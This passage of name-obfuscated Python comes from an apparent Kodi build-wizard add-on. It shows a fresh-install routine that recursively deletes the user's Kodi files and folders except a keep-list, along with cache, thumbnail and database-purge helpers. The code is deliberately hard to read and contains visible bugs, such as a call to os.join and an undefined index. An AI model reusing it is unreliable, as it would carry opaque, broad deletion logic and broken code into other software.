				elif O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'skin.Premium.mod'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4948
				elif O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'skin.anonymous.nox'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4949
				elif O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'skin.phenomenal'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4950
				elif O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'plugin.video.metalliq'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4951
				elif O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'skin.titan'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4953
				elif O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'pvr.iptvsimple'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4954
				elif O0O0O0OO000000OOO =='sources.xml'and O000OO000O0OO0O0O [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4956
				elif O0O0O0OO000000OOO =='quicknav.DATA.xml'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4959
				elif O0O0O0OO000000OOO =='x1101.DATA.xml'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4960
				elif O0O0O0OO000000OOO =='b-srtym-b.DATA.xml'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4961
				elif O0O0O0OO000000OOO =='x1102.DATA.xml'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4962
				elif O0O0O0OO000000OOO =='b-sdrvt-b.DATA.xml'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4963
				elif O0O0O0OO000000OOO =='x1112.DATA.xml'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4964
				elif O0O0O0OO000000OOO =='b-tlvvyzyh-b.DATA.xml'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4965
				elif O0O0O0OO000000OOO =='x1111.DATA.xml'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4966
				elif O0O0O0OO000000OOO =='b-tvknyshrly-b.DATA.xml'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4967
				elif O0O0O0OO000000OOO =='x1110.DATA.xml'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4968
				elif O0O0O0OO000000OOO =='b-yldym-b.DATA.xml'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4969
				elif O0O0O0OO000000OOO =='x1114.DATA.xml'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4970
				elif O0O0O0OO000000OOO =='b-mvzyqh-b.DATA.xml'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4971
				elif O0O0O0OO000000OOO =='mainmenu.DATA.xml'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4972
				elif O0O0O0OO000000OOO =='skin.Premium.mod.properties'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4973
				elif O0O0O0OO000000OOO =='x1122.DATA.xml'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4975
				elif O0O0O0OO000000OOO =='b-spvrt-b.DATA.xml'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4976
				elif O0O0O0OO000000OOO =='favourites.xml'and O000OO000O0OO0O0O [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4981
				elif O0O0O0OO000000OOO =='guisettings.xml'and O000OO000O0OO0O0O [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4983
				elif O0O0O0OO000000OOO =='profiles.xml'and O000OO000O0OO0O0O [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4984
				elif O0O0O0OO000000OOO =='advancedsettings.xml'and O000OO000O0OO0O0O [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4985
				elif O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4986
				elif O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'program.apollo'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4987
				elif O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4988
				elif O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'plugin.video.telemedia'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4989
				elif O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'plugin.video.elementum'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4992
				elif O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4994
				elif O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'weather.yahoo'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4995
				elif O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'plugin.video.quasar'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4996
				elif O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'program.apollo'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4997
				elif O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4998
				elif O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4999
				elif O0O0O0OO000000OOO in LOGFILES :wiz .log ("Keep Log File: %s"%O0O0O0OO000000OOO ,xbmc .LOGNOTICE )#line:5000
				elif O0O0O0OO000000OOO .endswith ('.db'):#line:5001
					try :#line:5002
						if O0O0O0OO000000OOO ==O00O00O00O000O0O0 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O0O0O0OO000000OOO ,KODIV ),xbmc .LOGNOTICE )#line:5003
						else :os .remove (os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ))#line:5004
					except Exception as OO0000O00O0OO00O0 :#line:5005
						if not O0O0O0OO000000OOO .startswith ('Textures13'):#line:5006
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:5007
							wiz .log ("-> %s"%(str (OO0000O00O0OO00O0 )),xbmc .LOGNOTICE )#line:5008
							wiz .purgeDb (os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ))#line:5009
				else :#line:5010
					DP .update (int (wiz .percentage (O00OO0000OOOOO000 ,O0000O00OO0OOOOO0 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0O0OO000000OOO ),'')#line:5011
					try :os .remove (os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ))#line:5012
					except Exception as OO0000O00O0OO00O0 :#line:5013
						wiz .log ("Error removing %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:5014
						wiz .log ("-> / %s"%(str (OO0000O00O0OO00O0 )),xbmc .LOGNOTICE )#line:5015
			if DP .iscanceled ():#line:5016
				DP .close ()#line:5017
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5018
				return False #line:5019
		for O0O0O0O00OO00O000 ,OOO0O00O00O0O0O00 ,O0OOO00OOOOOOOOO0 in os .walk (OOOOOO0O0O00O0000 ,topdown =True ):#line:5020
			OOO0O00O00O0O0O00 [:]=[O00O000OO000OOOO0 for O00O000OO000OOOO0 in OOO0O00O00O0O0O00 if O00O000OO000OOOO0 not in EXCLUDES ]#line:5021
			for O0O0O0OO000000OOO in OOO0O00O00O0O0O00 :#line:5022
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O0O0OO000000OOO ),'')#line:5023
			  if O0O0O0OO000000OOO not in ["Database","userdata","temp","addons","addon_data"]:#line:5024
			   if not (O0O0O0OO000000OOO =='script.skinshortcuts'and KEEPSKIN =='true'):#line:5025
			    if not (O0O0O0OO000000OOO =='skin.titan'and KEEPSKIN3 =='true'):#line:5027
			      if not (O0O0O0OO000000OOO =='pvr.iptvsimple'and KEEPPVR =='true'):#line:5028
			       if not (O0O0O0OO000000OOO =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5029
			        if not (O0O0O0OO000000OOO =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5030
			         if not (O0O0O0OO000000OOO =='program.apollo'and KEEPINFO =='true'):#line:5031
			          if not (O0O0O0OO000000OOO =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5032
			           if not (O0O0O0OO000000OOO =='weather.yahoo'and KEEPWEATHER =='true'):#line:5033
			            if not (O0O0O0OO000000OOO =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5034
			             if not (O0O0O0OO000000OOO =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5035
			              if not (O0O0O0OO000000OOO =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5036
			               if not (O0O0O0OO000000OOO =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5037
			                if not (O0O0O0OO000000OOO =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5038
			                 if not (O0O0O0OO000000OOO =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5039
			                  if not (O0O0O0OO000000OOO =='plugin.video.neptune'and KEEPINFO =='true'):#line:5040
			                   if not (O0O0O0OO000000OOO =='plugin.video.youtube'and KEEPINFO =='true'):#line:5041
			                    if not (O0O0O0OO000000OOO =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5042
			                     if not (O0O0O0OO000000OOO =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5043
			                      if not (O0O0O0OO000000OOO =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5044
			                       if not (O0O0O0OO000000OOO =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5045
			                           if not (O0O0O0OO000000OOO =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5049
			                            if not (O0O0O0OO000000OOO =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5050
			                             if not (O0O0O0OO000000OOO =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5051
			                              if not (O0O0O0OO000000OOO =='plugin.video.quasar'and KEEPINFO =='true'):#line:5052
			                               if not (O0O0O0OO000000OOO =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5053
			                                  shutil .rmtree (os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),ignore_errors =True ,onerror =None )#line:5055
			if DP .iscanceled ():#line:5056
				DP .close ()#line:5057
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5058
				return False #line:5059
		DP .close ()#line:5060
		wiz .clearS ('build')#line:5061
		if over ==True :#line:5062
			return True #line:5063
		elif install =='restore':#line:5064
			return True #line:5065
		elif install :#line:5066
			buildWizard (install ,'normal',over =True )#line:5067
		else :#line:5068
			if INSTALLMETHOD ==1 :OO00OO000O0OOOO0O =1 #line:5069
			elif INSTALLMETHOD ==2 :OO00OO000O0OOOO0O =0 #line:5070
			else :OO00OO000O0OOOO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5071
			if OO00OO000O0OOOO0O ==1 :wiz .reloadFix ('fresh')#line:5072
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5073
	else :#line:5074
		if not install =='restore':#line:5075
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5076
			wiz .refresh ()#line:5077
def clearCache ():#line:5082
		wiz .clearCache ()#line:5083
def fixwizard ():#line:5087
		wiz .fixwizard ()#line:5088
def totalClean ():#line:5090
		wiz .clearCache ()#line:5092
		wiz .clearPackages ('total')#line:5093
		clearThumb ('total')#line:5094
		cleanfornewbuild ()#line:5095
def cleanfornewbuild ():#line:5096
		try :#line:5097
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5098
		except :#line:5099
			pass #line:5100
		try :#line:5101
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5102
		except :#line:5103
			pass #line:5104
		try :#line:5105
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5106
		except :#line:5107
			pass #line:5108
def clearThumb (type =None ):#line:5109
	OOOOO0OOOOOOO000O =wiz .latestDB ('Textures')#line:5110
	if not type ==None :O00O00O000O0O00O0 =1 #line:5111
	else :O00O00O000O0O00O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OOOOO0OOOOOOO000O ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5112
	if O00O00O000O0O00O0 ==1 :#line:5113
		try :wiz .removeFile (os .join (DATABASE ,OOOOO0OOOOOOO000O ))#line:5114
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OOOOO0OOOOOOO000O )#line:5115
		wiz .removeFolder (THUMBS )#line:5116
	else :wiz .log ('Clear thumbnames cancelled')#line:5118
	wiz .redoThumbs ()#line:5119
def purgeDb ():#line:5121
	O0O00O0O000000O00 =[];O000O000O0O0OO00O =[]#line:5122
	for OOO000O0O000O000O ,O00OO00OO0OO000OO ,OOO0O0OOOO00OO0O0 in os .walk (HOME ):#line:5123
		for O0O0O00OOOOO0000O in fnmatch .filter (OOO0O0OOOO00OO0O0 ,'*.db'):#line:5124
			if O0O0O00OOOOO0000O !='Thumbs.db':#line:5125
				OO000O00000O000OO =os .path .join (OOO000O0O000O000O ,O0O0O00OOOOO0000O )#line:5126
				O0O00O0O000000O00 .append (OO000O00000O000OO )#line:5127
				O0O0O0O00O0OOO00O =OO000O00000O000OO .replace ('\\','/').split ('/')#line:5128
				O000O000O0O0OO00O .append ('(%s) %s'%(O0O0O0O00O0OOO00O [len (O0O0O0O00O0OOO00O )-2 ],O0O0O0O00O0OOO00O [len (O0O0O0O00O0OOO00O )-1 ]))#line:5129
	if KODIV >=16 :#line:5130
		O00OOO00OO000O00O =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O000O000O0O0OO00O )#line:5131
		if O00OOO00OO000O00O ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5132
		elif len (O00OOO00OO000O00O )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5133
		else :#line:5134
			for OOOOO0OO00OOO0OO0 in O00OOO00OO000O00O :wiz .purgeDb (O0O00O0O000000O00 [OOOOO0OO00OOO0OO0 ])#line:5135
	else :#line:5136
		O00OOO00OO000O00O =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O000O000O0O0OO00O )#line:5137
		if O00OOO00OO000O00O ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5138
		else :wiz .purgeDb (O0O00O0O000000O00 [OOOOO0OO00OOO0OO0 ])#line:5139
def fastupdatefirstbuild (OO0O0O0OOO0O0O00O ):#line:5145
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5147
	if ENABLE =='Yes':#line:5148
		if not NOTIFY =='true':#line:5149
			OOOO00OO0OO000O0O =wiz .workingURL (NOTIFICATION )#line:5150
			if OOOO00OO0OO000O0O ==True :#line:5151
				O000000O0OO0O0O0O ,OOO00OO00000OOOO0 =wiz .splitNotify (NOTIFICATION )#line:5152
				if not O000000O0OO0O0O0O ==False :#line:5154
					try :#line:5155
						O000000O0OO0O0O0O =int (O000000O0OO0O0O0O );OO0O0O0OOO0O0O00O =int (OO0O0O0OOO0O0O00O )#line:5156
						checkidupdate ()#line:5157
						wiz .setS ("notedismiss","true")#line:5158
						if O000000O0OO0O0O0O ==OO0O0O0OOO0O0O00O :#line:5159
							wiz .log ("[Notifications] id[%s] Dismissed"%int (O000000O0OO0O0O0O ),xbmc .LOGNOTICE )#line:5160
						elif O000000O0OO0O0O0O >OO0O0O0OOO0O0O00O :#line:5162
							wiz .log ("[Notifications] id: %s"%str (O000000O0OO0O0O0O ),xbmc .LOGNOTICE )#line:5163
							wiz .setS ('noteid',str (O000000O0OO0O0O0O ))#line:5164
							wiz .setS ("notedismiss","true")#line:5165
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5168
					except Exception as O00OO0000OO00O00O :#line:5169
						wiz .log ("Error on Notifications Window: %s"%str (O00OO0000OO00O00O ),xbmc .LOGERROR )#line:5170
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5172
